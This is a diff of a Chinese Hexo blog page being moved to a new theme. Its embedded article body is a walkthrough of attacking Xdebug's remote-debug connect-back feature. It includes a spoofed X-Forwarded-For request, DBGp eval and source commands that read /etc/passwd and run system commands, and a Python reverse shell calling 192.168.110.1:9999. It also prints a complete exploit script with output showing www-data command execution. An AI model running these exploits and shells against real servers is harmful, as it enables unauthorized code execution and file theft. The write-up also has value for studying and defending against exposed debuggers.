@@ -1,335 +1,341 @@
+
 <!DOCTYPE html>
-
-
-
-  
-
-
-<html class="theme-next muse use-motion" lang="zh">
-<head><meta name="generator" content="Hexo 3.9.0">
-  <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
-
-
-<meta http-equiv="Cache-Control" content="no-transform">
-<meta http-equiv="Cache-Control" content="no-siteapp">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
-
-
-
-
-  
-  
-  
-  
-
-  
+<html lang="zh-cn">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Hexo">
+    <title>xdebug - Hexo</title>
+    <meta name="author" content="John Doe">
     
     
-  
-
-  
-
-  
-
-  
-
-  
-
-  
     
-    
-    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
-  
-
-
-
-
-
-
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
-
-<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css">
-
-
-  <meta name="keywords" content="Hexo, NexT">
-
-
-
-
-
-
-
-
-  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2">
-
-
-
-
-
-
-<meta name="description" content="基础知识工作原理xedbug是一个调试php程序的扩展程序，因为php是一个写网站的语言，他的调试和python Java等也有所不同， 几个常见配置 123456789101112设置调试工具，xdebug.idekey=&amp;quot;PHPSTORM&amp;quot;绑定远程调试主机地址xdebug.remote_host=localhost远程主机监听的端口xdebug.remote_port=">
-<meta property="og:type" content="article">
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"articleBody":"\n\n基础知识工作原理xedbug是一个调试php程序的扩展程序，因为php是一个写网站的语言，他的调试和python Java等也有所不同，\n几个常见配置\n123456789101112设置调试工具，xdebug.idekey=&quot;PHPSTORM&quot;绑定远程调试主机地址xdebug.remote_host=localhost远程主机监听的端口xdebug.remote_port=9000开启回连xdebug.remote_connect_back = 1开启xdebugxdebug.remote_enable = 1\n\n回连地址xdebug的回连地址是通过自定义header，来判断回连到哪一个ip地址，\n一般由三个属性决定\n12345xdebug.remote_addr_headerX-Forwarded-For Remote-Addr\n\nxff是可以在请求头中伪造的，所以就算配置了其他的两个，也没有关系，照样可以连接到我指定的ip地址上\n固定ip模式默认情况下，\n1xdebug.remote_connect_back = 0\n\n也叫固定ip模式\n这种情况下，后台会去访问\nxdebug.remote_host=localhost\nxdebug.remote_port=9000\n这一对ip 和端口，默认是localhost:9000 这样只适合单一客户端请求\n非固定ip模式1xdebug.remote_connect_back = 1\n\n这时后台会去访问回连地址。依次访问\n这时候问题就出现了，如果在请求头中加入一个xff字段，那么就可以让服务器回连到指定的ip地址上\n利用条件1234567xdebug.remote_connect_back = 1   //开启回连 并且此选项开启时，xdebug会忽略xdebug.remote_host直接把客户端ip当作回连ip，也就是谁访问它，谁就是回连ipxdebug.remote_enable = 1         //开启xdebugxdebug.remote_log =  /tmp/test.log\n\nDBGp协议source1source -i transaction_id -f fileURI\n\ntransaction_id 貌似没有那么硬性的要求，每次都为 1 即可，fileURI 是要读取的文件的路径，需要注意的是，Xdebug 也受限于 open_basedir。\n利用方式\n1source -i 1 -f file:///etc/passwd\n\n还可以利用php://filter  ssrf等\n脚本里面要这样写\n1conn.sendall(&apos;source -i 1 -f %s\\x00&apos; % data)\n\neval12345eval -i transaction_id -- &#123;DATA&#125;&#123;DATA&#125; 为 base64 过的 PHP 代码。 利用方式（c3lzdGVtKCJpZCIpOw== == system(&quot;id&quot;);）：eval -i 1 -- c3lzdGVtKCJpZCIpOw==\n\n脚本里面要这样写\n1conn.sendall(&apos;eval -i 1 -- %s\\x00&apos; % data.encode(&apos;base64&apos;))\n\nproperty_set代码执行 和eval一样，要是eval被禁了，可以用这个\n123/* Do the eval */eval_string = xdebug_sprintf(&quot;%s = %s&quot;, CMD_OPTION(&apos;n&apos;), new_value);res = xdebug_do_eval(eval_string, &amp;ret_zval TSRMLS_CC);\n\n利用方式\n12property_set -n $a -i 1 -c 1 -- c3lzdGVtKCJpZCIpOw== property_get -n $a -i 1 -c 1 -p 0\n\n脚本里面要这样写\n1conn.sendall(&apos;property_set -n $a -i 1 -c 1 -- %s\\x00&apos; % data.encode(&apos;base64&apos;))\n\n利用过程请求头\n12345678910GET /index.php?XDEBUG_SESSION_START=phpstrom HTTP/1.1Host: 192.168.110.140:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1X-Forwarded-For:192.168.110.1Connection: closeUpgrade-Insecure-Requests: 1\n\n本地监听9000端口\n123456nc -lvp 9000listening on [any] 9000 ...192.168.110.140: inverse host lookup failed: h_errno 11004: NO_DATAconnect to [192.168.110.1] from (UNKNOWN) [192.168.110.140] 53884: NO_DATA486 &lt;?xml version=\"1.0\" encoding=\"iso-8859-1\"?&gt;&lt;init xmlns=\"urn:debugger_protocol_v1\" xmlns:xdebug=\"http://xdebug.org/dbgp/xdebug\" fileuri=\"file:///var/www/html/index.php\" language=\"PHP\" xdebug:language_version=\"7.1.12\" protocol_version=\"1.0\" appid=\"23\" idekey=\"phpstrom\"&gt;&lt;engine version=\"2.5.5\"&gt;&lt;![CDATA[Xdebug]]&gt;&lt;/engine&gt;&lt;author&gt;&lt;![CDATA[Derick Rethans]]&gt;&lt;/author&gt;&lt;url&gt;&lt;![CDATA[http://xdebug.org]]&gt;&lt;/url&gt;&lt;copyright&gt;&lt;![CDATA[Copyright (c) 2002-2017 by Derick Rethans]]&gt;&lt;/copyright&gt;&lt;/init&gt;\n\n可以确定服务端开启了xdebug，并且开启了远程连接\n攻击链先是burp发送请求访问调试界面，这时因为xdebug开启了回连，依次请求\n12345xdebug.remote_addr_headerX-Forwarded-For Remote-Addr\n\n当访问到X-Forwarded-For的时候，就会访问其所指向的ip和端口(端口默认是9000，会自动的去请求9000端口，所以ip上不用加上9000端口)，这时在本地监听9000端口就可以收到xdebug发送的请求\n执行命令创建一个exp2.py\n123456789101112131415#!/usr/bin/python2import socketip_port = ('0.0.0.0',9000)sk = socket.socket()sk.bind(ip_port)sk.listen(10)conn, addr = sk.accept()while True:    client_data = conn.recv(1024)    print(client_data)    data = raw_input('&gt;&gt; ')    conn.sendall('eval -i 1 -- %s\\x00' % data.encode('base64'))\n\n这段代码就是代替nc 监听9000端口(eval可以换成source property_set等)\n主机运行\n1python2 exp2.py\n\nburp发包\n12345678910GET /index.php?XDEBUG_SESSION_START=phpstrom HTTP/1.1Host: 192.168.110.140:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1X-Forwarded-For:192.168.110.1Connection: closeUpgrade-Insecure-Requests: 1\n\n还是刚才那个数据包\n也可以这样,更方便一点\n1curl 'http://192.168.110.140/index.php?XDEBUG_SESSION_START=PHPSTORM' -H \"X-Forwarded-For:你的公网IP地址\"\n\n在回弹的窗口中执行\n123&gt;&gt; system('ls');263 &lt;?xml version=\"1.0\" encoding=\"iso-8859-1\"?&gt;&lt;response xmlns=\"urn:debugger_protocol_v1\" xmlns:xdebug=\"http://xdebug.org/dbgp/xdebug\" command=\"eval\" transaction_id=\"1\"&gt;&lt;property type=\"string\" size=\"9\" encoding=\"base64\"&gt;&lt;![CDATA[aW5kZXgucGhw]]&gt;&lt;/property&gt;&lt;/response&gt;\n\n注意这里的ls命令是在linux下的  如果在windows下，需要cmd命令\n这一段\n1[CDATA[aW5kZXgucGhw]]&gt;\n\nbase64解码 就可以拿到文件名 ==&gt;index.php\nfile协议读文件123&gt;&gt; system('curl file:///etc/passwd')348 &lt;?xml version=\"1.0\" encoding=\"iso-8859-1\"?&gt;&lt;response xmlns=\"urn:debugger_protocol_v1\" xmlns:xdebug=\"http://xdebug.org/dbgp/xdebug\" command=\"eval\" transaction_id=\"1\"&gt;&lt;property type=\"string\" size=\"72\" encoding=\"base64\"&gt;&lt;![CDATA[c3lzdGVtZC1idXMtcHJveHk6eDoxMDM6MTA2OnN5c3RlbWQgQnVzIFByb3h5LCwsOi9ydW4vc3lzdGVtZDovYmluL2ZhbHNl]]&gt;&lt;/property&gt;&lt;/response&gt;\n\n这里好像有字符数量限制\n利用source读文件12只需要把eval改成这样conn.sendall('source -i 1 -f file:///%s\\x00' % data)\n\n这里还是有点问题，不能一次读完 貌似得用绝对路径  \n用index.php的时候，报错没找到文件   ./index.php也不行\n123&gt;&gt; ./index.php283 &lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;&lt;response xmlns=&quot;urn:debugger_protocol_v1&quot; xmlns:xdebug=&quot;http://xdebug.org/dbgp/xdebug&quot; command=&quot;source&quot; transaction_id=&quot;1&quot; status=&quot;starting&quot; reason=&quot;ok&quot;&gt;&lt;error code=&quot;100&quot;&gt;&lt;message&gt;&lt;![CDATA[can not open file]]&gt;&lt;/message&gt;&lt;/error&gt;&lt;/response&gt;\n\n连续两次命令，会把第一次没有发送完的文件，在发送过来（难道是nc接受的问题？？？ 或者是服务端限制了文件的大小，当第二次读文件的时候，会从上一次结束的地方，继续往下读）\n12345&gt;&gt; /etc/passwd1805 &lt;?xml version=\"1.0\" encoding=\"iso-8859-1\"?&gt;&lt;response xmlns=\"urn:debugger_protocol_v1\" xmlns:xdebug=\"http://xdebug.org/dbgp/xdebug\" command=\"source\" transaction_id=\"1\" encoding=\"base64\"&gt;&lt;![CDATA[cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9u&gt;&gt; /etc/passwdb2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtdGltZXN5bmM6eDoxMDA6MTAzOnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb24sLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzdGVtZC1uZXR3b3JrOng6MTAxOjEwNDpzeXN0ZW1kIE5ldHdvcmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQvbmV0aWY6L2Jpbi9mYWxzZQpzeXN0ZW1kLXJlc29sdmU6eDoxMDI6MTA1OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kL3Jlc29sdmU6L2Jpbi9mYWxzZQpzeXN0ZW1kLWJ1cy1wcm94eTp4OjEwMzoxMDY6c3lzdGVtZCBCdXMgUHJveHksLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UK\n\n反弹shell用python反弹一下\n123456import socket,subprocess,oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((\"192.168.110.1\",9999));os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call([\"/bin/sh\",\"-i\"])\n\n写木马利用base64\n12\n\n访问shell.php 可以执行phpinfo()\n这里附上 exp p神的一键脚本\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#!/usr/bin/env python3import reimport sysimport timeimport requestsimport argparseimport socketimport base64import binasciifrom concurrent.futures import ThreadPoolExecutorpool = ThreadPoolExecutor(1)session = requests.session()session.headers = &#123;    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'&#125;def recv_xml(sock):    blocks = []    data = b''    while True:        try:            data = data + sock.recv(1024)        except socket.error as e:            break        if not data:            break        while data:            eop = data.find(b'\\x00')            if eop &lt; 0:                break            blocks.append(data[:eop])            data = data[eop+1:]        if len(blocks) &gt;= 4:            break        return blocks[3]def trigger(url):    time.sleep(2)    try:        session.get(url + '?XDEBUG_SESSION_START=phpstorm', timeout=0.1)    except:        passif __name__ == '__main__':    parser = argparse.ArgumentParser(description='XDebug remote debug code execution.')    parser.add_argument('-c', '--code', required=True, help='the code you want to execute.')    parser.add_argument('-t', '--target', required=True, help='target url.')    parser.add_argument('-l', '--listen', default=9000, type=int, help='local port')    args = parser.parse_args()        ip_port = ('0.0.0.0', args.listen)    sk = socket.socket()    sk.settimeout(10)    sk.bind(ip_port)    sk.listen(5)    pool.submit(trigger, args.target)    conn, addr = sk.accept()    conn.sendall(b''.join([b'eval -i 1 -- ', base64.b64encode(args.code.encode()), b'\\x00']))    data = recv_xml(conn)    print('[+] Recieve data: ' + data.decode())    g = re.search(rb'&lt;\\!\\[CDATA\\[([a-z0-9=\\./\\+]+)\\]\\]&gt;', data, re.I)    if not g:        print('[-] No result...')        sys.exit(0)    data = g.group(1)    try:        print('[+] Result: ' + base64.b64decode(data).decode())    except binascii.Error:        print('[-] May be not string result...')\n\n结果\n1234E:\\tools\\netcat&gt;python3 exp.py -t http://192.168.110.140:8080/index.php -c \"shell_exec('id');\"[+] Recieve data: &lt;?xml version=\"1.0\" encoding=\"iso-8859-1\"?&gt;&lt;response xmlns=\"urn:debugger_protocol_v1\" xmlns:xdebug=\"http://xdebug.org/dbgp/xdebug\" command=\"eval\" transaction_id=\"1\"&gt;&lt;property type=\"string\" size=\"54\" encoding=\"base64\"&gt;&lt;![CDATA[dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK]]&gt;&lt;/property&gt;&lt;/response&gt;[+] Result: uid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n参考链接\nhttps://blog.spoock.com/2017/09/19/xdebug-attack-surface/\nhttps://paper.seebug.org/397/\nhttps://www.restran.net/2017/09/16/php-xdebug-cmd-exec/\nhttps://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py\n","dateCreated":"2019-09-24T15:19:05+08:00","dateModified":"2019-10-09T14:04:00+08:00","datePublished":"2019-09-24T15:19:05+08:00","description":"","headline":"xdebug","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/24/xdebug/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"url":"http://yoursite.com/2019/09/24/xdebug/"}</script>
+    <meta name="description" content="基础知识工作原理xedbug是一个调试php程序的扩展程序，因为php是一个写网站的语言，他的调试和python Java等也有所不同， 几个常见配置 123456789101112设置调试工具，xdebug.idekey=&amp;quot;PHPSTORM&amp;quot;绑定远程调试主机地址xdebug.remote_host=localhost远程主机监听的端口xdebug.remote_port=">
+<meta property="og:type" content="blog">
 <meta property="og:title" content="xdebug">
 <meta property="og:url" content="http://yoursite.com/2019/09/24/xdebug/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="基础知识工作原理xedbug是一个调试php程序的扩展程序，因为php是一个写网站的语言，他的调试和python Java等也有所不同， 几个常见配置 123456789101112设置调试工具，xdebug.idekey=&amp;quot;PHPSTORM&amp;quot;绑定远程调试主机地址xdebug.remote_host=localhost远程主机监听的端口xdebug.remote_port=">
-<meta property="og:locale" content="zh">
+<meta property="og:locale" content="zh-cn">
 <meta property="og:updated_time" content="2019-10-09T06:04:00.442Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="xdebug">
 <meta name="twitter:description" content="基础知识工作原理xedbug是一个调试php程序的扩展程序，因为php是一个写网站的语言，他的调试和python Java等也有所不同， 几个常见配置 123456789101112设置调试工具，xdebug.idekey=&amp;quot;PHPSTORM&amp;quot;绑定远程调试主机地址xdebug.remote_host=localhost远程主机监听的端口xdebug.remote_port=">
+    
+    
+        
+    
+    
+    
+    
+    
+    <!--STYLES-->
+    <link rel="stylesheet" href="/assets/css/style-6tgl0yz7lnfzkusrxanjzjinweinxlhwhjly7phr1vxoylo39j7uvbjbwsfg.min.css">
+    <!--STYLES END-->
+    
 
+    
 
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Muse',
-    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: true,
-    tabs: true,
-    motion: true,
-    duoshuo: {
-      userId: '0',
-      author: 'Author'
-    },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-
-  <link rel="canonical" href="http://yoursite.com/2019/09/24/xdebug/">
-
-
-
-
-
-  <title>xdebug | Hexo</title>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+    
+        
+    
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh">
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
 
-  
-  
-    
-  
 
-  <div class="container sidebar-position-left page-post-detail ">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
     
 
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Hexo</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
+<header id="header" data-behavior="4">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a
+            class="header-title-link"
+            href="/ "
+            aria-label=""
+        >
+            Hexo
+        </a>
     </div>
-      
-        <p class="site-subtitle"></p>
-      
-  </div>
-
-  <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-<nav class="site-nav">
-  
-
-  
-    <ul id="menu" class="menu">
-      
+    
         
-        <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
-            
-            Home
-          </a>
-        </li>
-      
+            <a
+                class="header-right-picture "
+                href="#about"
+                aria-label="打开链接: /#about"
+            >
         
-        <li class="menu-item menu-item-archives">
-          <a href="/archives/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
-            
-            Archives
-          </a>
-        </li>
-      
         
-        <li class="menu-item menu-item-tags">
-          <a href="/tags/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
-            
-            Tags
-          </a>
-        </li>
-      
+        </a>
+    
+</header>
 
-      
-    </ul>
-  
+            <!-- Define author's picture -->
 
-  
+
+<nav id="sidebar" data-behavior="4">
+    <div class="sidebar-container">
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/"
+                            
+                            rel="noopener"
+                            title="首页"
+                        >
+                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">首页</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-categories"
+                            
+                            rel="noopener"
+                            title="分类"
+                        >
+                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">分类</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-tags"
+                            
+                            rel="noopener"
+                            title="标签"
+                        >
+                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">标签</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-archives"
+                            
+                            rel="noopener"
+                            title="归档"
+                        >
+                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">归档</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link open-algolia-search"
+                            href="#search"
+                            
+                            rel="noopener"
+                            title="搜索"
+                        >
+                        <i class="sidebar-button-icon fa fa-search" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">搜索</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="#about"
+                            
+                            rel="noopener"
+                            title="关于"
+                        >
+                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">关于</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://github.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="GitHub"
+                        >
+                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">GitHub</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="http://stackoverflow.com/users"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Stack Overflow"
+                        >
+                        <i class="sidebar-button-icon fab fa-stack-overflow" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Stack Overflow</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://twitter.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Twitter"
+                        >
+                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Twitter</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://facebook.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Facebook"
+                        >
+                        <i class="sidebar-button-icon fab fa-facebook" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Facebook</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://plus.google.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Google Plus"
+                        >
+                        <i class="sidebar-button-icon fab fa-google-plus" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Google Plus</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://www.linkedin.com/profile/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="LinkedIn"
+                        >
+                        <i class="sidebar-button-icon fab fa-linkedin" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">LinkedIn</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/mailto"
+                            
+                            rel="noopener"
+                            title="邮箱"
+                        >
+                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">邮箱</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/atom.xml"
+                            
+                            rel="noopener"
+                            title="RSS"
+                        >
+                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">RSS</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
 </nav>
 
-
-
- </div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
             
-
-  <div id="posts" class="posts-expand">
+            <div id="main" data-behavior="4"
+                 class="
+                        hasCoverMetaIn
+                        ">
+                
+<article class="post">
     
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/24/xdebug/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
     
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">xdebug</h1>
-        
-
+        <div class="post-header main-content-wrap text-left">
+    
+        <h1 class="post-title">
+            xdebug
+        </h1>
+    
+    
         <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-24T15:19:05+08:00">
-                2019-09-24
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
+    <time datetime="2019-09-24T15:19:05+08:00">
+	
+		    9月 24, 2019
+    	
+    </time>
     
+</div>
 
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
+</div>
 
-      
-      
-
-      
-        <a id="more"></a>
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <a id="more"></a>
 
 <h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>xedbug是一个调试php程序的扩展程序，因为php是一个写网站的语言，他的调试和python Java等也有所不同，</p>
 <p>几个常见配置</p>
@@ -442,330 +448,315 @@
 <p><a href="https://www.restran.net/2017/09/16/php-xdebug-cmd-exec/" target="_blank" rel="noopener">https://www.restran.net/2017/09/16/php-xdebug-cmd-exec/</a></p>
 <p><a href="https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py</a></p>
 
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/09/23/xxe/" rel="next" title="xxe">
-                <i class="fa fa-chevron-left"></i> xxe
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/09/24/php-session/" rel="prev" title="php-session">
-                php-session <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-
